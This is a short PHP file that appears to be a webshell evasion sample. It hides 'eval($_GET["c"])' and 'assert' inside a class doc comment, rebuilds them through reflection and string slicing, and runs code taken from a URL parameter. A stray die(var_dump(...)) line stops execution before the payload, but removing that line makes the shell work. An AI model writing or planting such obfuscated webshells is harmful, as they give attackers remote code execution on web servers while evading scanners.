<?php
    /**
    * eva
    * l($_GE
    * T["c"]);
    * asse
    * rt
    */
    class TestClass { }
    $rc = new ReflectionClass('TestClass');
    $str = $rc->getDocComment();
    die(var_dump($str));
    $evf=substr($str,strpos($str,'e'),3);
    $evf=$evf.substr($str,strpos($str,'l'),6);
    $evf=$evf.substr($str,strpos($str,'T'),8);
    $fu=substr($str,strpos($str,'as'),4);
    $fu=$fu.substr($str,strpos($str,'r'),2);
    $fu($evf);
?> 